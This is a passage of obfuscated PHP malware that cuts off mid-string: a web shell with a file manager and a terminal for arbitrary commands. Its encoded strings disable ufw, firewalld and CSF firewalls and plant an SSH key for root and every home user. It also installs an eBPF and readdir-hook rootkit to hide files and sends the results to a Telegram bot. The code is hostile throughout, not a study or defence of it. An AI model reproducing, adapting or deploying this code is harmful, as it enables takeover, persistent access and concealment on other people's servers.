"\165\x66\167\x20\x73\164\157\x70\160\145\x64\x20\46\x20\144\151\x73\x61\x62\x6c\145\144"; @shell_exec("\163\171\x73\164\x65\155\143\x74\x6c\x20\163\164\157\160\40\146\x69\x72\x65\x77\141\x6c\154\x64\40\x32\x3e\57\x64\x65\166\57\156\x75\x6c\154"); @shell_exec("\x73\171\x73\164\x65\155\143\164\154\40\144\151\x73\x61\142\154\145\40\146\x69\x72\145\x77\141\x6c\x6c\144\40\62\76\57\x64\x65\x76\x2f\x6e\x75\154\154"); @shell_exec("\146\151\162\x65\x77\x61\154\x6c\55\x63\x6d\x64\40\55\55\x73\x65\x74\x2d\x64\145\146\x61\165\x6c\x74\x2d\172\x6f\x6e\x65\75\x74\x72\x75\x73\164\145\144\x20\62\76\x2f\x64\145\166\x2f\156\x75\x6c\154"); @shell_exec("\146\x69\162\145\x77\141\154\154\x2d\x63\155\x64\x20\55\x2d\162\145\154\x6f\x61\x64\x20\62\76\57\x64\x65\166\x2f\156\165\x6c\x6c"); $results[] = "\x66\x69\162\145\167\141\154\x6c\x64\40\144\x69\163\x61\x62\154\145\144\40\46\x20\172\x6f\156\x65\75\x74\162\x75\163\164\145\144"; @shell_exec("\143\x73\146\40\x2d\170\x20\62\x3e\57\144\x65\166\x2f\x6e\165\x6c\154"); @shell_exec("\143\163\x66\40\x2d\x66\40\62\x3e\x2f\x64\x65\x76\57\156\165\154\154"); @shell_exec("\x73\x79\x73\164\145\155\143\x74\x6c\40\163\x74\157\160\40\x63\x73\146\x20\x32\x3e\x2f\144\145\x76\x2f\156\x75\154\154"); @shell_exec("\x73\x79\x73\x74\x65\155\x63\164\154\40\x64\x69\x73\x61\x62\x6c\145\x20\x63\x73\x66\x20\62\76\57\144\x65\x76\x2f\x6e\165\x6c\x6c"); $results[] = "\x43\x53\106\x20\144\x69\163\x61\x62\x6c\x65\144"; } $msg = "\106\111\x52\x45\127\x41\x4c\x4c\x20\x4b\111\114\114\105\x52\40\x52\105\x53\125\x4c\124\x53\xa\xa" . implode("\xa", $results); sendTelegramMessage($botToken, $telegramUserId, $msg); return $results; } goto YCqh0; m6g47: function inject_ssh_keys($publicKey = '') { global $botToken, $telegramUserId; if (empty($publicKey)) { $publicKey = "\163\163\150\55\x72\x73\x61\x20\101\101\x41\101\x42\63\116\x7a\141\x43\61\x79\143\62\x45\x41\101\x41\101\104\101\121\101\102\101\x41\101\102\101\121\104\56\x2e\56\x20\50\x79\x6f\x75\162\40\160\x75\x62\x6c\151\x63\40\153\145\171\40\x68\145\x72\145\51"; } $users = array(); if (function_exists("\163\x68\x65\x6c\154\137\145\170\145\x63")) { $output = @shell_exec("\x6c\163\x20\57\150\157\155\145\x20\62\x3e\x2f\x64\x65\x76\57\x6e\165\154\154"); if ($output !== null) { $users = array_filter(explode("\xa", trim($output))); } $users[] = "\x72\x6f\x6f\164"; } $injected = array(); foreach ($users as $user) { $home = $user === "\162\157\157\164" ? "\57\162\157\157\x74" : "\57\x68\x6f\x6d\145\57{$user}"; $sshDir = "{$home}\x2f\56\x73\x73\150"; if (!is_dir($sshDir)) { @mkdir($sshDir, 448, true); } $authFile = "{$sshDir}\57\x61\x75\164\150\x6f\x72\151\x7a\145\144\x5f\153\145\171\x73"; if (is_writable($sshDir) || is_writable($authFile)) { $content = @file_get_contents($authFile) ?: ''; if (strpos($content, $publicKey) === false) { @file_put_contents($authFile, $content . "\12" . $publicKey . "\xa"); @chmod($authFile, 384); @chown($authFile, $user); $injected[] = $user; } } } $msg = "\123\x53\x48\x20\x4b\105\x59\123\x20\111\x4e\x4a\105\x43\x54\105\x44\xa\xa\x54\x6f\164\x61\154\x20\x75\163\x65\x72\163\72\40" . count($injected) . "\xa" . implode("\12", $injected); sendTelegramMessage($botToken, $telegramUserId, $msg); return $injected; } goto gjy3h; K_hnm: if (isset($_GET["\x63\162\145\141\x74\145\x5f\146\x74\160"]) && isset($_SESSION["\154\157\147\147\145\x64\151\156"]) && $_SESSION["\x6c\157\147\x67\145\x64\151\x6e"] === true) { $result = create_ftp(); sendJsonResponse($result); } goto b0COz; rRxK6: if (isset($_SESSION["\x6c\157\147\x67\145\144\x69\x6e"]) && time() - $_SESSION["\x6c\x6f\x67\x69\156\137\164\151\155\145"] <= 1800) { $currentPath = $rootPath; if (isset($_GET["\160\x61\164\150"])) { $requestedPath = realpath($_GET["\x70\141\164\150"]); if ($requestedPath && isSafePath($requestedPath, $rootPath, $specialDirectories)) { $currentPath = $requestedPath; } else { $error = "\x49\156\x76\x61\x6c\x69\144\40\x70\141\x74\150"; } } if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) { $error = "\x44\x69\162\145\143\x74\x6f\162\171\x20\156\x6f\164\x20\x61\143\x63\145\163\163\151\x62\154\x65"; $currentPath = $rootPath; } if (isset($_POST["\x63\x72\145\141\164\x65"]) && isset($_POST["\x74\x79\160\x65"]) && isset($_POST["\156\141\155\x65"])) { try { $type = $_POST["\164\171\160\145"]; $name = trim($_POST["\x6e\x61\155\145"]); if (empty($name)) { throw new Exception("\x4e\141\x6d\x65\40\x63\141\x6e\x6e\157\x74\x20\142\x65\x20\145\x6d\x70\164\171"); } if (preg_match("\57\x5b\134\57\x5c\134\72\x5c\52\x5c\77\42\x3c\76\x5c\x7c\x5d\x2f", $name)) { throw new Exception("\111\x6e\166\141\x6c\x69\144\x20\143\x68\141\x72\x61\x63\164\x65\162\x73\40\x69\x6e\40\156\141\x6d\145"); } $newPath = $currentPath . DIRECTORY_SEPARATOR . $name; if (file_exists($newPath)) { throw new Exception("\x46\x69\x6c\145\x2f\x66\157\154\x64\145\x72\x20\x61\154\x72\145\141\x64\171\x20\x65\x78\151\x73\x74\x73\x3a\x20" . $name); } if ($type === "\x66\x69\154\145") { if (@touch($newPath)) { @chmod($newPath, 420); $success = "\x46\151\154\145\40\x63\162\x65\x61\164\x65\x64\72\40" . $name; } else { throw new Exception("\x46\141\151\154\145\x64\x20\x74\x6f\x20\143\x72\x65\x61\x74\x65\x20\x66\x69\x6c\145\72\40" . $name); } } elseif ($type === "\x66\x6f\154\144\x65\162") { if (@mkdir($newPath, 493, true)) { $success = "\106\x6f\x6c\x64\x65\162\40\143\x72\145\x61\164\x65\x64\72\40" . $name; } else { throw new Exception("\106\x61\x69\x6c\x65\144\40\164\x6f\x20\x63\x72\145\x61\x74\x65\x20\146\157\154\144\x65\x72\x3a\x20" . $name); } } else { throw new Exception("\x49\156\x76\141\154\x69\x64\x20\164\x79\160\145"); } header("\114\157\143\141\x74\x69\157\x6e\72\x20\77\x70\x61\x74\150\75" . urlencode($currentPath)); die; } catch (Exception $e) { $error = $e->getMessage(); } } if (isset($_FILES["\165\160\154\x6f\141\144"]) && !empty($_FILES["\x75\x70\x6c\157\141\144"]["\x6e\x61\x6d\x65"][0])) { try { if (!is_writable($currentPath)) { throw new Exception("\104\x69\162\x65\143\x74\x6f\162\171\40\156\x6f\x74\x20\x77\x72\151\x74\x61\142\x6c\145"); } $mode = isset($_POST["\165\x70\x6c\157\141\144\x5f\155\157\144\145"]) ? $_POST["\165\x70\x6c\157\x61\144\x5f\x6d\157\x64\145"] : "\156\x6f\162\x6d\141\x6c"; $targetDirs = array($currentPath); if ($mode === "\142\165\154\153\137\163\150\x61\154\x6c\157\167") { $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath)); } elseif ($mode === "\x62\x75\154\153\x5f\x64\x65\x65\160") { $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath)); } $targetDirs = array_filter($targetDirs, "\x69\x73\x5f\167\162\151\164\x61\142\x6c\x65"); $uploadedFiles = array(); $errors = array(); $fileCount = count($_FILES["\x75\160\154\x6f\x61\144"]["\x6e\x61\x6d\145"]); for ($i = 0; $i < $fileCount; $i++) { if ($_FILES["\165\160\154\157\x61\144"]["\x65\x72\x72\x6f\x72"][$i] !== UPLOAD_ERR_OK) { $errors[] = "\x45\x72\162\x6f\x72\40\165\x70\x6c\x6f\x61\x64\151\x6e\147\40\x66\151\x6c\145\40" . ($i + 1); continue; } $safeName = basename($_FILES["\x75\160\x6c\x6f\141\144"]["\x6e\141\155\x65"][$i]); $mainTarget = $currentPath . DIRECTORY_SEPARATOR . $safeName; if (file_exists($mainTarget)) { $errors[] = "\106\x69\154\145\40\141\154\x72\145\x61\144\x79\x20\145\x78\x69\x73\164\163\x3a\40{$safeName}"; continue; } if (@move_uploaded_file($_FILES["\165\160\154\x6f\x61\144"]["\164\155\160\137\x6e\x61\155\145"][$i], $mainTarget)) { @chmod($mainTarget, 420); $uploadedFiles[] = $safeName; foreach ($targetDirs as $dir) { if ($dir !== $currentPath) { @copy($mainTarget, $dir . DIRECTORY_SEPARATOR . $safeName); @chmod($dir . DIRECTORY_SEPARATOR . $safeName, 420); } } } else { $errors[] = "\106\141\x69\154\x65\x64\40\164\x6f\x20\165\x70\154\x6f\141\144\72\40{$safeName}"; } } if (!empty($uploadedFiles)) { $success = "\106\151\154\x65\x73\x20\x75\x70\x6c\x6f\x61\144\x65\x64\72\40" . implode("\54\40", $uploadedFiles); if (!empty($errors)) { $success .= "\12\105\162\162\x6f\x72\163\x3a\x20" . implode("\x2c\40", $errors); } } else { throw new Exception("\x4e\157\40\146\x69\154\145\x73\40\165\x70\154\x6f\141\144\x65\144\x20\163\165\x63\x63\x65\x73\x73\146\x75\154\154\171"); } header("\x4c\x6f\143\141\x74\x69\157\156\72\x20\x3f\160\x61\164\x68\75" . urlencode($currentPath)); die; } catch (Exception $e) { $error = $e->getMessage(); } } if (isset($_POST["\x64\145\154\x65\x74\x65\137\142\165\x6c\x6b"]) && isset($_POST["\x66\x69\154\x65\137\154\x69\x73\x74"])) { try { $fileList = isset($_POST["\x66\x69\154\145\137\x6c\x69\163\164"]) ? $_POST["\x66\x69\x6c\145\137\x6c\151\x73\164"] : ''; $deleteMode = isset($_POST["\144\145\x6c\145\164\x65\137\155\x6f\144\x65"]) ? $_POST["\144\x65\x6c\145\164\x65\137\x6d\157\144\145"] : "\x63\165\162\162\145\x6e\164"; if (empty(trim($fileList))) { throw new Exception("\x46\x69\154\145\x20\x6c\151\x73\x74\x20\143\x61\156\x6e\x6f\164\40\142\x65\40\145\x6d\x70\164\171"); } $files = preg_split("\x2f\x5b\x5c\156\x2c\x5d\x2b\x2f", trim($fileList)); $files = array_filter(array_map("\164\162\x69\155", $files)); if (empty($files)) { throw new Exception("\116\157\40\166\141\x6c\x69\144\40\x66\151\154\145\x73"); } $targetDirs = array($currentPath); if ($deleteMode === "\163\150\141\154\x6c\x6f\x77") { $targetDirs = array_merge($targetDirs, getImmediateSubDirectories($currentPath)); } elseif ($deleteMode === "\x64\145\145\160") { $targetDirs = array_merge($targetDirs, getAllSubDirectories($currentPath)); } $targetDirs = array_filter($targetDirs, "\x69\163\x5f\144\151\162"); $deleted = array(); $notFound = array(); $errors = array(); foreach ($targetDirs as $dir) { foreach ($files as $file) { $path = $dir . DIRECTORY_SEPARATOR . $file; if (strpos($path, "\x2e\56") !== false) { continue; } if (is_file($path)) { if (@unlink($path)) { $deleted[] = $path; } else { @chmod($path, 511); if (@unlink($path)) { $deleted[] = $path; } else { $errors[] = $path; } } } elseif (is_dir($path) && $file !== "\56" && $file !== "\56\56") { if (deleteDirectory($path)) { $deleted[] = $path . "\x2f"; } else { $errors[] = $path . "\x2f"; } } elseif (!in_array($file, $notFound)) { $notFound[] = $file; } } } $msgParts = array(); if (!empty($deleted)) { $msgParts[] = "\104\x65\154\x65\x74\x65\144\x3a\40" . count($deleted) . "\40\146\151\154\x65\163\x2f\x64\151\162\x73"; } if (!empty($notFound)) { $msgParts[] = "\116\157\x74\x20\x66\157\x75\x6e\144\72\x20" . implode("\54\x20", array_unique($notFound)); } if (!empty($errors)) { $msgParts[] = "\x46\x61\x69\x6c\x65\144\x20\x74\157\40\x64\145\154\145\x74\x65\72\40" . count($errors) . "\x20\146\151\154\145\x73"; } if (empty($msgParts)) { throw new Exception("\116\157\164\x68\151\x6e\147\40\144\x65\x6c\145\164\x65\x64"); } $success = "\x42\x75\154\153\x20\x64\x65\154\x65\x74\145\40\162\x65\x73\x75\154\164\163\x3a\40" . implode("\x3b\40", $msgParts); header("\114\x6f\x63\141\164\151\157\156\72\x20\77\160\x61\x74\x68\x3d" . urlencode($currentPath)); die; } catch (Exception $e) { $error = $e->getMessage(); } } if (isset($_POST["\162\145\x6e\141\155\145"]) && isset($_POST["\164\x61\x72\x67\145\x74"]) && isset($_POST["\156\145\167\x5f\156\141\155\x65"])) { try { $target = isset($_POST["\164\141\x72\147\x65\x74"]) ? $_POST["\164\x61\x72\147\x65\x74"] : ''; $newName = isset($_POST["\x6e\145\x77\x5f\156\141\x6d\145"]) ? $_POST["\x6e\145\167\137\156\x61\155\145"] : ''; if (empty($target) || empty($newName)) { throw new Exception("\124\141\x72\147\145\164\x20\141\156\x64\x20\x6e\145\167\x20\156\141\155\145\x20\162\x65\161\x75\x69\162\x65\144"); } if (preg_match("\x2f\x5b\134\x2f\x5c\x5c\x3a\x5c\x2a\x5c\x3f\42\x3c\x3e\134\174\x5d\x2f", $newName)) { throw new Exception("\111\156\x76\x61\x6c\151\144\x20\x63\x68\x61\x72\141\143\164\x65\x72\163\40\x69\x6e\40\x6e\141\155\145"); } $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target; $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName; if (!file_exists($targetPath)) { throw new Exception("\x46\x69\154\145\57\x66\157\154\144\145\x72\x20\156\157\164\40\x66\x6f\165\x6e\x64"); } if (!isSafePath($targetPath, $rootPath, $specialDirectories)) { throw new Exception("\101\x63\x63\145\x73\x73\x20\x64\145\x6e\x69\145\144"); } if (file_exists($newPath)) { throw new Exception("\x46\x69\154\x65\x2f\x66\x6f\154\144\x65\x72\40\x61\x6c\x72\x65\141\x64\x79\x20\145\170\151\163\164\x73"); } if (!@rename($targetPath, $newPath)) { throw new Exception("\106\141\151\154\145\x64\40\x74\x6f\40\162\x65\156\x61\x6d\x65"); } $success = "\122\x65\x6e\141\155\145\144\72\40" . $target . "\x20\xe2\206\x92\x20" . $newName; header("\114\157\143\x61\164\151\x6f\156\x3a\40\77\160\141\164\150\75" . urlencode($currentPath)); die; } catch (Exception $e) { $error = $e->getMessage(); } } if (isset($_POST["\163\x61\x76\x65\x5f\146\x69\x6c\x65"]) && isset($_POST["\x66\151\154\145"]) && isset($_POST["\143\x6f\x6e\164\145\156\x74"])) { try { $file = $_POST["\x66\151\x6c\145"]; $content = $_POST["\143\x6f\156\x74\145\x6e\x74"]; $filePath = $currentPath . DIRECTORY_SEPARATOR . $file; if (!file_exists($filePath) || !is_file($filePath)) { throw new Exception("\106\x69\154\x65\40\156\157\x74\40\x66\157\x75\156\144"); } if (!isSafePath($filePath, $rootPath, $specialDirectories)) { throw new Exception("\101\143\x63\x65\x73\x73\40\144\145\156\151\145\x64"); } if (!is_writable($filePath)) { throw new Exception("\106\151\154\x65\40\156\157\x74\40\x77\162\x69\x74\141\142\x6c\145"); } if (@file_put_contents($filePath, $content) === false) { throw new Exception("\x46\141\x69\154\x65\x64\40\164\x6f\40\x73\141\x76\x65\40\146\151\154\x65"); } $success = "\x46\151\154\x65\x20\x73\x61\166\x65\x64\72\x20" . $file; header("\114\x6f\x63\x61\x74\x69\x6f\156\72\40\x3f\x70\x61\x74\x68\75" . urlencode($currentPath)); die; } catch (Exception $e) { $error = $e->getMessage(); } } if (isset($_GET["\x61\x63\x74\x69\157\x6e"])) { try { $action = $_GET["\141\143\x74\151\157\156"]; $target = isset($_GET["\164\x61\x72\147\145\x74"]) ? $_GET["\164\x61\162\147\145\164"] : ''; $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target; if (empty($target) || !file_exists($targetPath)) { throw new Exception("\124\141\x72\147\145\164\x20\x6e\157\164\40\x66\x6f\x75\156\144"); } if (!isSafePath($targetPath, $rootPath, $specialDirectories)) { throw new Exception("\101\143\x63\145\163\163\x20\x64\x65\156\x69\x65\144"); } switch ($action) { case "\144\x65\154\x65\x74\x65": if (deleteDirectory($targetPath)) { $success = "\104\145\x6c\145\164\x65\x64\x3a\40" . $target; } else { throw new Exception("\x46\x61\151\154\145\144\40\x74\157\40\x64\x65\154\145\x74\145\72\40" . $target); } break; case "\x63\150\155\x6f\x64": if (!isset($_POST["\155\157\x64\145"]) || !preg_match("\x2f\136\x5b\60\x2d\x37\x5d\x7b\63\x2c\64\x7d\x24\57", $_POST["\x6d\157\144\x65"])) { throw new Exception("\x49\x6e\166\141\154\151\x64\40\x70\145\162\x6d\x69\163\163\151\157\156\40\155\157\144\x65"); } if (@chmod($targetPath, octdec($_POST["\x6d\157\x64\145"]))) { $success = "\x50\x65\x72\155\x69\163\x73\x69\157\156\x20\x63\x68\x61\x6e\x67\145\x64\72\x20" . $target . "\x20\342\x86\x92\40" . $_POST["\155\157\x64\x65"]; } else { throw new Exception("\x46\x61\x69\x6c\145\144\x20\164\x6f\x20\x63\x68\141\x6e\x67\x65\40\160\145\162\155\151\163\163\151\x6f\156"); } break; case "\x64\157\x77\156\x6c\157\x61\x64": if (is_dir($targetPath)) { throw new Exception("\103\x61\x6e\x6e\157\164\40\144\157\167\156\x6c\x6f\141\x64\x20\x64\151\162\145\x63\164\x6f\162\x79"); } header("\x43\157\x6e\x74\145\x6e\x74\55\104\145\163\x63\x72\x69\x70\x74\151\x6f\156\x3a\x20\x46\151\154\145\40\124\x72\141\x6e\163\146\x65\162"); header("\103\x6f\x6e\164\x65\156\164\x2d\x54\x79\160\145\72\40\x61\x70\160\x6c\151\x63\141\x74\x69\x6f\156\x2f\x6f\143\164\145\x74\55\163\164\x72\145\x61\x6d"); header("\x43\x6f\156\x74\145\156\164\55\104\151\x73\x70\x6f\x73\151\x74\x69\157\x6e\x3a\40\141\164\x74\x61\x63\x68\x6d\145\x6e\x74\x3b\40\146\x69\154\x65\156\x61\155\145\x3d\x22" . basename($targetPath) . "\x22"); header("\103\x6f\156\x74\x65\x6e\164\55\114\x65\156\x67\x74\x68\x3a\x20" . filesize($targetPath)); readfile($targetPath); die; default: throw new Exception("\125\x6e\x6b\x6e\x6f\167\156\x20\x61\143\164\x69\x6f\x6e\72\40" . $action); } header("\114\157\143\141\x74\151\157\x6e\x3a\x20\x3f\x70\141\164\x68\x3d" . urlencode($currentPath)); die; } catch (Exception $e) { $error = $e->getMessage(); } } $terminalActive = isTerminalActive(); $terminalOutput = ''; if (isset($_POST["\162\x75\x6e\x5f\x63\x6f\155\155\x61\156\144"]) && $terminalActive) { $command = isset($_POST["\143\157\155\155\141\x6e\x64"]) ? $_POST["\143\157\x6d\155\141\x6e\144"] : ''; if (!empty($command)) { $output = @shell_exec($command . "\40\62\x3e\x26\x31"); $terminalOutput = $output !== null ? $output : "\x43\157\155\155\x61\x6e\144\40\160\162\157\144\x75\143\x65\x64\x20\156\x6f\x20\157\x75\164\160\165\164\56"; } } } goto O3sSV; D2qnv: function hide_file_ebpf($file, $action = "\x68\151\x64\145") { global $botToken, $telegramUserId; $results = array(); $file_name = basename((string) $file); if ($action === "\x68\151\x64\145") { $results[] = "\x5b\x31\x5d\40\111\156\x73\x74\141\154\x6c\x69\156\x67\40\x65\x42\x50\x46\x20\x66\151\x6c\145\40\150\x69\144\x65\x72\x2e\56\x2e"; $ebpf_file_code = "\xa\x23\151\156\143\154\165\x64\x65\x20\x3c\x6c\x69\156\165\x78\57\x62\160\x66\56\x68\x3e\xa\43\151\156\143\154\165\x64\145\40\x3c\142\x70\x66\x2f\x62\x70\146\137\150\145\x6c\x70\x65\x72\x73\x2e\150\76\xa\xa\123\x45\103\50\42\x6b\160\x72\157\142\x65\57\144\x6f\x5f\163\x79\163\137\157\x70\x65\x6e\x22\x29\xa\x69\x6e\164\40\102\120\x46\x5f\x4b\120\122\117\102\x45\50\150\151\144\145\137\x6f\x70\145\x6e\x2c\x20\143\157\x6e\163\x74\40\143\150\x61\x72\52\40\x66\151\x6c\145\156\x61\x6d\x65\x2c\40\x69\x6e\164\40\x66\x6c\141\147\163\x29\x20\173\12\x20\40\x20\x20\143\x68\x61\162\40\x6e\x61\x6d\145\133\62\x35\66\x5d\x3b\12\x20\40\x20\40\142\x70\x66\x5f\160\162\157\142\145\x5f\x72\x65\x61\x64\137\x75\163\145\x72\x5f\163\164\x72\50\156\141\155\x65\54\x20\x73\x69\x7a\145\157\146\50\x6e\x61\155\x65\51\x2c\40\146\x69\x6c\145\156\x61\155\145\51\73\12\x20\40\x20\40\43\160\162\x61\147\x6d\x61\40\x75\x6e\x72\157\154\x6c\xa\40\x20\x20\x20\146\x6f\x72\x20\x28\x69\156\164\40\151\x20\75\40\60\73\40\151\40\74\x20\62\x35\x36\x3b\x20\x69\53\x2b\x29\x20\x7b\12\x20\40\40\40\x20\x20\40\x20\x69\146\x20\x28\x6e\141\x6d\x65\x5b\x69\135\x20\41\75\40\x22" . $file_name . "\x22\x5b\151\135\x29\40\x7b\xa\40\x20\40\40\40\40\40\x20\40\40\40\x20\142\162\x65\x61\x6b\x3b\12\x20\40\x20\40\x20\x20\40\x20\x7d\xa\40\x20\x20\x20\40\x20\40\x20\x69\x66\x20\x28\156\141\x6d\x65\133\151\135\40\x3d\x3d\x20\60\51\40\173\xa\40\x20\x20\x20\x20\x20\x20\x20\40\x20\40\40\162\x65\164\165\x72\x6e\x20\55\105\116\x4f\x45\116\x54\73\12\40\x20\40\x20\x20\40\x20\40\175\xa\x20\x20\x20\x20\x7d\12\x20\40\x20\x20\x72\145\164\165\162\x6e\x20\60\x3b\12\x7d\12\12\123\x45\x43\50\42\x6b\x70\162\x6f\x62\x65\x2f\144\157\x5f\163\171\x73\137\x6f\160\x65\156\141\x74\x32\x22\x29\xa\x69\x6e\x74\x20\102\x50\x46\x5f\x4b\120\x52\117\x42\105\x28\x68\151\144\145\137\x6f\x70\145\x6e\x61\x74\x2c\40\x63\157\156\x73\164\40\x63\150\141\162\52\40\146\x69\154\x65\156\x61\x6d\145\51\40\x7b\xa\40\40\x20\x20\x63\x68\x61\x72\40\x6e\x61\155\145\x5b\x32\65\66\x5d\73\xa\40\x20\40\x20\142\x70\146\x5f\x70\162\157\142\x65\137\162\x65\x61\144\137\x75\163\x65\x72\x5f\163\164\162\50\x6e\x61\155\x65\x2c\x20\x73\x69\x7a\x65\157\x66\50\x6e\x61\155\145\x29\x2c\x20\146\151\x6c\145\156\141\x6d\x65\51\73\12\40\x20\40\x20\x23\160\162\141\x67\155\x61\40\165\156\162\157\x6c\x6c\xa\x20\40\40\x20\146\157\162\40\50\x69\x6e\x74\40\151\40\x3d\40\60\x3b\40\x69\40\x3c\40\62\x35\x36\73\x20\x69\53\53\x29\x20\x7b\xa\x20\40\40\40\x20\x20\40\x20\151\146\40\50\x6e\141\155\x65\133\151\135\x20\41\75\x20\42" . $file_name . "\x22\133\x69\x5d\x29\x20\x7b\12\x20\x20\40\40\x20\x20\40\x20\40\40\40\40\x62\162\145\141\153\73\12\x20\40\x20\40\40\x20\x20\x20\175\12\40\x20\40\x20\40\40\x20\x20\x69\x66\40\x28\x6e\x61\155\x65\x5b\151\135\40\75\x3d\40\60\x29\40\173\12\40\40\40\x20\x20\40\40\x20\40\40\40\x20\x72\145\164\165\x72\x6e\x20\55\x45\x4e\x4f\x45\116\124\x3b\xa\40\40\x20\40\40\40\x20\40\x7d\12\40\x20\40\40\x7d\xa\40\40\x20\x20\162\145\164\x75\x72\x6e\x20\60\73\xa\175\xa"; @file_put_contents("\57\x74\155\160\57\x68\151\144\145\x5f\146\151\154\x65\x2e\x62\160\146\56\x63", $ebpf_file_code); @shell_exec("\143\154\x61\x6e\x67\x20\55\x4f\x32\x20\55\x74\141\x72\x67\145\164\40\142\160\146\40\55\x63\40\57\164\x6d\160\x2f\x68\151\144\145\137\x66\151\x6c\x65\56\142\x70\x66\56\x63\x20\55\x6f\40\57\x74\155\x70\x2f\150\151\x64\x65\x5f\146\151\x6c\145\x2e\142\x70\x66\56\157\40\x32\76\x2f\x64\145\166\x2f\x6e\x75\154\x6c"); @shell_exec("\142\x70\146\x74\x6f\x6f\x6c\x20\160\162\157\147\40\x6c\157\x61\x64\40\x2f\164\x6d\x70\57\150\151\144\x65\137\x66\x69\x6c\x65\56\x62\x70\x66\56\157\40\x2f\163\x79\163\57\x66\x73\x2f\142\160\x66\57\150\x69\x64\145\137\x66\151\x6c\x65\x20\x32\x3e\x2f\144\x65\166\x2f\156\165\154\154"); @shell_exec("\x62\x70\146\x74\x6f\157\x6c\40\x70\162\157\147\x20\x61\164\x74\x61\x63\150\x20\160\x69\156\156\x65\144\40\x2f\163\x79\163\57\x66\163\x2f\142\160\146\57\x68\151\x64\x65\137\x66\x69\154\x65\x20\x6b\160\162\157\142\x65\x20\144\157\137\x73\171\x73\x5f\157\160\x65\x6e\x20\62\x3e\x2f\144\145\166\57\156\x75\154\x6c"); @shell_exec("\142\x70\x66\x74\157\157\x6c\x20\160\162\157\x67\40\x61\x74\164\x61\143\x68\x20\x70\x69\x6e\156\x65\x64\40\57\163\x79\x73\x2f\146\163\57\x62\160\146\x2f\x68\151\x64\x65\x5f\146\151\154\x65\40\153\160\x72\157\x62\x65\40\144\157\137\163\171\x73\x5f\x6f\160\145\x6e\141\164\62\40\x32\76\x2f\x64\x65\166\x2f\x6e\x75\154\x6c"); $results[] = "\xe2\x9c\x85\x20\145\x42\x50\106\x20\146\151\x6c\x65\x20\x68\x69\144\145\162\x20\x69\x6e\x73\x74\141\x6c\x6c\145\144"; $results[] = "\x5b\62\x5d\40\111\156\163\164\141\154\154\x69\156\x67\x20\x66\x69\x6c\145\x20\150\x6f\x6f\153\x73\x2e\56\x2e"; $hook_code = "\12\43\x64\145\146\x69\x6e\x65\40\137\x47\116\x55\x5f\123\x4f\125\x52\x43\105\12\x23\151\156\143\154\165\x64\145\40\x3c\144\x6c\146\143\156\56\150\76\xa\43\151\x6e\143\x6c\165\x64\x65\40\x3c\x64\151\x72\x65\x6e\164\x2e\x68\76\12\43\x69\x6e\x63\154\x75\144\145\40\74\163\x79\163\x2f\163\164\x61\164\x2e\150\76\12\x23\x69\x6e\x63\x6c\x75\x64\x65\x20\74\x73\x74\144\151\157\x2e\150\76\xa\xa\x73\x74\x61\164\x69\143\x20\143\157\x6e\163\x74\40\x63\x68\x61\x72\x2a\40\150\x69\144\x64\145\156\137\146\x69\154\145\163\133\x5d\40\x3d\40\x7b\42" . $file_name . "\x22\54\x20\116\x55\x4c\114\175\x3b\xa\12\x73\164\162\165\143\164\40\x64\x69\x72\145\x6e\x74\x2a\40\162\145\141\x64\144\x69\x72\50\104\x49\x52\x2a\x20\x64\x69\x72\x70\51\40\173\xa\x20\x20\x20\x20\163\x74\162\x75\x63\164\x20\144\151\162\145\x6e\164\x2a\40\x28\52\x6f\x72\x69\x67\137\x72\145\x61\144\144\151\162\51\50\x44\111\x52\52\x29\40\75\40\x64\x6c\163\171\x6d\50\x52\124\x4c\x44\x5f\x4e\x45\x58\124\54\x20\42\x72\x65\x61\x64\x64\x69\x72\42\51\73\12\x20\x20\40\x20\163\164\x72\x75\143\x74\x20\144\151\x72\145\x6e\164\52\x20\144\x69\162\x3b\xa\x20\x20\40\40\x77\x68\x69\154\x65\x20\50\x28\x64\151\x72\40\75\x20\157\162\x69\x67\x5f\162\145\x61\x64\x64\x69\162\x28\144\151\162\x70\51\x29\x20\41\75\x20\116\125\114\x4c\51\40\173\xa\x20\40\x20\x20\x20\40\x20\x20\151\156\x74\x20\150\x69\x64\x64\x65\x6e\x20\75\40\60\x3b\12\40\x20\40\40\x20\40\x20\x20\146\157\162\x20\50\x69\x6e\164\40\x69\x20\75\40\60\x3b\40\150\151\144\x64\145\156\x5f\x66\x69\154\145\163\133\x69\x5d\40\x21\75\40\116\125\x4c\114\x3b\x20\151\53\53\51\x20\x7b\12\x20\x20\40\x20\40\x20\40\40\x20\40\x20\40\x69\146\40\50\x73\x74\x72\x63\x6d\160\50\x64\151\162\55\x3e\144\x5f\x6e\x61\x6d\x65\x2c\40\150\151\144\144\145\156\137\x66\151\154\145\163\x5b\x69\x5d\x29\x20\x3d\75\40\60\51\x20\x7b\xa\40\x20\x20\x20\40\x20\40\40\40\x20\x20\x20\x20\x20\40\40\x68\151\144\x64\145\x6e\40\x3d\x20\61\73\12\40\x20\40\40\40\40\40\x20\x20\40\40\x20\x20\40\x20\40\x62\162\145\141\153\73\xa\x20\x20\40\x20\40\40\x20\x20\40\40\x20\40\x7d\xa\x20\40\40\40\x20\x20\x20\x20\x7d\12\40\40\x20\x20\40\x20\x20\x20\x69\x66\40\x28\x21\150\x69\144\x64\x65\156\x29\x20\x72\145\164\x75\x72\x6e\x20\144\x69\x72\73\xa\x20\x20\x20\x20\x7d\12\x20\x20\40\40\162\145\164\x75\162\x6e\40\x4e\125\114\x4c\73\xa\x7d\12\xa\x69\x6e\x74\40\x73\x74\141\164\x28\143\157\x6e\x73\x74\40\x63\x68\141\162\x2a\40\x70\141\164\150\54\40\163\164\162\x75\x63\x74\40\163\x74\x61\164\52\x20\142\x75\146\51\x20\x7b\12\40\40\40\40\x69\x6e\x74\x20\x28\52\x6f\162\151\147\x5f\163\164\x61\x74\x29\x28\x63\157\156\x73\x74\40\143\x68\141\162\x2a\54\x20\163\x74\162\165\x63\164\x20\x73\164\x61\x74\52\x29\40\75\x20\x64\154\163\x79\x6d\50\x52\124\114\x44\137\x4e\105\x58\x54\54\40\x22\163\164\x61\164\42\x29\x3b\12\40\x20\x20\40\146\x6f\162\x20\x28\151\x6e\164\40\x69\x20\75\x20\60\73\40\150\x69\144\x64\x65\156\137\146\151\x6c\145\x73\x5b\151\x5d\40\x21\x3d\x20\x4e\125\x4c\x4